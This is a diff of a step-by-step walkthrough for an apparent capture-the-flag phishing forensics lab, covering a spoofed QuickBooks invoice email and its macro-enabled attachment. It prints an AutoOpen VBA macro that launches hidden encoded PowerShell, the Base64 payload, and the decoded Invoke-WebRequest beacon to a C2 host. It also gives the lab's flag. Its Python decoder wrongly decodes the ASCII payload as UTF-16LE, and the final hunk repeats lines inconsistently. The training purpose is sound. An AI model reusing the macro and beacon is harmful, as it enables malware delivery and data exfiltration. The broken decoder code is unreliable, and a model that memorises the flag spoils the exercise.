@@ -24,42 +24,42 @@ On September 10, 2026, an Accounts Payable specialist at `FIN-WS-1002` received 
 
 ## 🎯 Investigation Methodology: Step-by-Step
 
-Follow these sequential steps in the interactive Marimo notebook or in your terminal environment:
+Follow these sequential steps in the interactive Marimo DFIR Console:
 
-### Step 1: Email Header & Sender Authentication Forensics
+### Step 1: Email Header & Sender Authentication Forensics (Tab: `📨 Mail Headers & Auth`)
 
 1. **Review Top KPI Indicators**:
-   - In the top header cards of the Marimo notebook, observe:
-     - **DMARC Verdict**: `FAIL (Spoofed)`
-     - **DKIM Signature**: `FAIL`
+   - In the header of the console, observe:
+     - **DMARC Policy Alignment**: `FAIL (p=reject; disposition=none)`
+     - **DKIM Signature**: `FAIL (None)`
      - **SPF Validation**: `SOFTFAIL`
-     - **Macro Attachments**: `1 File(s)`
-     - **Correlated DNS Lookups**: Active telemetry for host `10.0.2.19`
+     - **Extracted Attachments**: `1 File(s)`
 2. **Inspect RFC 822 Email Headers**:
-   - Scroll to **Step 1: Email Header Forensics** and examine the headers table:
+   - Examine the evaluated headers table:
      - **From**: `Intuit Billing Alert <billing@quickbooks-invoicing-update.com>`
      - **To**: `accountspayable@corp.internal`
      - **Subject**: `URGENT: Outstanding Overdue Invoice #INV-2026-8891`
      - **X-Originating-IP**: `203.0.113.88`
      - **Authentication-Results**: `spf=softfail (sender IP 203.0.113.88); dkim=fail; dmarc=fail`
-3. **Analyze Authentication Failure**:
-   - Notice that the domain `quickbooks-invoicing-update.com` is a typosquatting domain impersonating QuickBooks.
+3. **Acquire Raw Evidence**:
+   - Click **📥 Download Raw RFC 822 Email (.eml)** to save the untouched forensic evidence file.
+4. **Analyze Authentication Failure**:
+   - Notice that `quickbooks-invoicing-update.com` is a typosquatting domain impersonating QuickBooks.
    - Because the sender IP `203.0.113.88` is not authorized by the legitimate SPF record and the cryptographic DKIM signature failed verification, DMARC evaluated to `fail`.
-   - _Key Analyst Insight_: A properly configured mail gateway set to `p=reject` would have quarantined this email at the perimeter.
 
 ---
 
-### Step 2: Attachment Forensics & VBA Macro Dissection
+### Step 2: Attachment Carving & Macro Dissection (Tab: `📎 Attachment Carving`)
 
 1. **Examine Document Metadata**:
-   - In **Step 2: Extracted Attachment & Decompiled Macro Dissection**, review the metadata:
+   - Review the carved document metadata:
      - **Filename**: `Invoice_Sept2026_OVERDUE.docm`
-     - **File Size**: `1,842 bytes`
-     - **SHA-256**: `e2d67b077a565a443dd4aa5905d419b457e53ef788a4dbdae330e7c5148679f2`
-     - **File Type**: Microsoft Word Macro-Enabled Document (`.docm`)
-2. **Decompile the Embedded Macro**:
+     - **MIME Format**: Microsoft Word Macro-Enabled Document (`.docm`)
+     - **SHA-256**: Calculated on the raw attachment bytes
+2. **Acquire Carved Sample**:
+   - Click **📥 Download Carved Document (.docm)** to save the weaponized document sample.
+3. **Decompile the Embedded Macro**:
    - Inspect the decompiled VBA code:
-
      ```vb
      Sub AutoOpen()
          Dim cmd As String
@@ -67,47 +67,63 @@ Follow these sequential steps in the interactive Marimo notebook or in your term
          Shell(cmd, vbHide)
      End Sub
      ```
-
-3. **Trace Execution Mechanism**:
+4. **Trace Execution Mechanism**:
    - The procedure `AutoOpen()` executes immediately upon opening the document when macros are enabled.
    - `Shell(cmd, vbHide)` launches `powershell.exe` in a hidden background window (`vbHide`).
    - The argument `-enc` specifies a Base64-encoded command string.
 
 ---
 
-### Step 3: Interactive DFIR Decoder Tool
+### Step 3: Malware Payload Deobfuscation (Tab: `💻 Deobfuscator & Scratchpad`)
 
-1. **Locate the Decoder Workbench**:
-   - Scroll to **Step 3: Interactive DFIR Decoder Tool**.
-   - The Base64 string from the macro is automatically loaded into the input box:
-     `SW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2MyLWV4ZmlsLW5vZGUuZGFya25ldC1yb3V0aW5nLm9yZy9iZWFjb24gLUhlYWRlciBAe0tleT0iRkxBR3tkbWFyY19mYWlsX2ludm9pY2VfYzJfZG9tYWluX2RldGVjdGVkfSJ9`
-2. **Select Encoding Mode**:
-   - Keep the default `Encoding Format:` as **`UTF-8 / ASCII`**.
-3. **Inspect the Decoded PowerShell Output**:
-   ```powershell
-   Invoke-WebRequest http://c2-exfil-node.darknet-routing.org/beacon -Header @{Key="FLAG{dmarc_fail_invoice_c2_domain_detected}"}
-   ```
-4. **Identify the Core Findings**:
-   - **C2 Beacon URI**: `http://c2-exfil-node.darknet-routing.org/beacon`
-   - **Exfiltration / Authentication Header**: `FLAG{dmarc_fail_invoice_c2_domain_detected}`
+DFIR analysts can deobfuscate the command line using either the live Python console or the interactive decoder:
+
+#### Option A: Live Python Deobfuscator
+Run or modify the pre-loaded script in the embedded Python scratchpad:
+```python
+import base64, re
+
+vba_code = attachments[0]['content_text']
+match = re.search(r'-enc\s+([A-Za-z0-9+/=]+)', vba_code)
+if match:
+    b64_payload = match.group(1)
+    # PowerShell -EncodedCommand uses UTF-16LE encoding
+    decoded_cmd = base64.b64decode(b64_payload).decode('utf-16le')
+    output = decoded_cmd
+output
+```
+
+#### Option B: Manual Decoder Widget
+1. Copy the Base64 string from the macro:
+   `SW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2MyLWV4ZmlsLW5vZGUuZGFya25ldC1yb3V0aW5nLm9yZy9iZWFjb24gLUhlYWRlciBAe0tleT0iRkxBR3tkbWFyY19mYWlsX2ludm9pY2VfYzJfZG9tYWluX2RldGVjdGVkfSJ9`
+2. Paste it into the **Manual Base64 Decoder Input** box.
+3. Set **Encoding Format** to `UTF-8 / ASCII` or `UTF-16LE`.
+
+#### Decoded PowerShell Output:
+```powershell
+Invoke-WebRequest http://c2-exfil-node.darknet-routing.org/beacon -Header @{Key="FLAG{dmarc_fail_invoice_c2_domain_detected}"}
+```
+
+* **C2 Beacon URI**: `http://c2-exfil-node.darknet-routing.org/beacon`
+* **Exfiltration / Authentication Header**: `FLAG{dmarc_fail_invoice_c2_domain_detected}`
 
 ---
 
-### Step 4: Correlated Host DNS Telemetry & C2 Analysis
+### Step 4: Host DNS Telemetry & C2 Correlation (Tab: `📡 DNS C2 Correlation`)
 
 1. **Cross-Reference Network DNS Logs**:
-   - Scroll to **Step 4: Correlated Host DNS Telemetry & C2 Analysis**.
+   - In the **DNS C2 Correlation** tab, inspect the recorded DNS queries.
 2. **Trace the Victim Host Queries**:
-   - Observe that endpoint `FIN-WS-1002` (`10.0.2.19`) issued an `A` record DNS query for `c2-exfil-node.darknet-routing.org`.
-   - **DNS Server**: `10.0.0.2` (Internal Active Directory DNS)
+   - Endpoint `FIN-WS-1002` (`10.0.2.19`) issued an `A` record query for `c2-exfil-node.darknet-routing.org` at `2026-09-10 08:46:15 UTC`.
    - **Resolved C2 IP**: `198.51.100.99`
-   - **Response Code**: `NOERROR`
-   - This confirms that host `10.0.2.19` successfully resolved the C2 server address and initiated outbound HTTP communication.
+   - This confirms that host `10.0.2.19` successfully reached out to the external adversary C2 infrastructure.
 
 ---
 
-### Step 5: Flag Verification & Submission
+### Step 5: Case Verification & Submission (Tab: `🏁 Case Verification & IOCs`)
 
+1. **Verify the Flag**:
+   - In **Step 5: Verify Incident Flag & IOCs**, enter:
 1. **Verify the Flag in the Notebook**:
    - In **Step 5: Verify Incident Flag & Threat Intel Report**, enter:
      `FLAG{dmarc_fail_invoice_c2_domain_detected}`
@@ -115,6 +131,7 @@ Follow these sequential steps in the interactive Marimo notebook or in your term
    - Confirm the green success banner: `🎉 FLAG VERIFIED CORRECT!`.
    - Upon correct verification, the confirmed **Threat Intelligence Indicators (IOCs)** report unlocks below the input box.
 2. **Submit to Portal**:
+   - Copy `FLAG{dmarc_fail_invoice_c2_domain_detected}` into the CyberLab challenge submission box to claim 100 points.
    - Copy `FLAG{dmarc_fail_invoice_c2_domain_detected}` into the CyberLab challenge submission box in the left portal pane to claim your 100 points and register your Phishing DFIR competency.
 
 ---
